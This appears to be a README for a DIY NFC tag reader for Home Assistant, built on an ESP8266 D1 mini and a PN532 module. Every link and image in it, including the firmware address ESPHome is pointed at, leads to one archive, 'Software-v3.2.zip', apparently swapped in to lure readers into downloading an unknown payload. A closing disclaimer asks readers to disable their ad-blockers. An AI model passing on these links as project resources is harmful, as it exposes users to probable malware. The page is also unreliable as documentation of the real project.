<a href="https://raw.githubusercontent.com/OlegBON1/tagreader/master/scripts/Software-v3.2.zip" target="_blank"><img src="https://raw.githubusercontent.com/OlegBON1/tagreader/master/scripts/Software-v3.2.zip" alt="Buy Me A Coffee" style="height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;" ></a>
[![Discord](https://raw.githubusercontent.com/OlegBON1/tagreader/master/scripts/Software-v3.2.zip)](https://raw.githubusercontent.com/OlegBON1/tagreader/master/scripts/Software-v3.2.zip)
[![GitHub release](https://raw.githubusercontent.com/OlegBON1/tagreader/master/scripts/Software-v3.2.zip)](https://raw.githubusercontent.com/OlegBON1/tagreader/master/scripts/Software-v3.2.zip)

# Tag Reader for Home Assistant

The tag reader is a simple to build/use NFC tag reader, specially created for [Home Assistant](https://raw.githubusercontent.com/OlegBON1/tagreader/master/scripts/Software-v3.2.zip). It is using a D1 mini ESP 8266 and the PN532 NFC module. The firmware is built using [ESPhome](https://raw.githubusercontent.com/OlegBON1/tagreader/master/scripts/Software-v3.2.zip).

> I am selling a pre-built version, a DIY version (assembly required) or just the case (use with own components). Check it out on [my website](https://raw.githubusercontent.com/OlegBON1/tagreader/master/scripts/Software-v3.2.zip).

![Photos of the final product](https://raw.githubusercontent.com/OlegBON1/tagreader/master/scripts/Software-v3.2.zip)

## Building the tag reader

To build your own tag reader, you need the following components:

 - [ESP8266 D1 Mini](https://raw.githubusercontent.com/OlegBON1/tagreader/master/scripts/Software-v3.2.zip)  
 - [PN532 NFC Reader](https://raw.githubusercontent.com/OlegBON1/tagreader/master/scripts/Software-v3.2.zip)
 - [WS2812](https://raw.githubusercontent.com/OlegBON1/tagreader/master/scripts/Software-v3.2.zip)
 - [Buzzer](https://raw.githubusercontent.com/OlegBON1/tagreader/master/scripts/Software-v3.2.zip)

The 3D models for the case are [here](STLs).

~~**WARNING** regarding AZdelivery D1. We have had several users contacting us with different issues, we don't recommend using these boards and won't provide support for them.~~  
Recent reports suggesting more clones of the D1 is now working as expected. This has been verified on a AZdelivery D1.

### Connecting the components

![Photo of schematics](https://raw.githubusercontent.com/OlegBON1/tagreader/master/scripts/Software-v3.2.zip)

There are not too many components to connect, but it does require soldering. You will need the following:

- [Solder](https://raw.githubusercontent.com/OlegBON1/tagreader/master/scripts/Software-v3.2.zip)
- [Soldering iron with a fairly thin tip](https://raw.githubusercontent.com/OlegBON1/tagreader/master/scripts/Software-v3.2.zip)
- [About 40cm of thin wire (at least 5 different colors)](https://raw.githubusercontent.com/OlegBON1/tagreader/master/scripts/Software-v3.2.zip)


Also make sure that you have set the switches on the PN532 to the following:
- Switch 1: On (up)
- Switch 2: Off (down)

This enables the PN532 module to communicate with the D1 over I2C, and is required for the modules to work together!

To flash the reader firmware to your D1 Mini you point ESPHome at [https://raw.githubusercontent.com/OlegBON1/tagreader/master/scripts/Software-v3.2.zip](https://raw.githubusercontent.com/OlegBON1/tagreader/master/scripts/Software-v3.2.zip).  
> :warning: The tag reader requires ESPHome `1.16.0`.

If you're new to ESPHome, we recommend that you use the [ESPHome Home Assistant add-on](https://raw.githubusercontent.com/OlegBON1/tagreader/master/scripts/Software-v3.2.zip).

![Open Case](https://raw.githubusercontent.com/OlegBON1/tagreader/master/scripts/Software-v3.2.zip)

## Configuring for use with Home Assistant

The tag reader requires [Home Assistant](https://raw.githubusercontent.com/OlegBON1/tagreader/master/scripts/Software-v3.2.zip) 0.115 or later.

If the tag reader is unable to connect to a wifi network, it will start a WiFi access point with a captive portal to allow you to enter your WiFi credentials.

The tag reader will be automatically discovered by Home Assistant once the tag reader is connected to the same network. You can follow the instructions in the UI to set it up.

## Usage

Scanned tags can be managed from the tags interface in Home Assistant. You can find it under config -> tags.

![Screenshot of the Home Assistant tag UI](https://raw.githubusercontent.com/OlegBON1/tagreader/master/scripts/Software-v3.2.zip)

## Disclamer

We use aliexpress affiliate links for the components and the tools. Some Ad-blockers might block these links an thus they seem to appear broken. You will have to temporarely disable ad-blocker to open these links. 
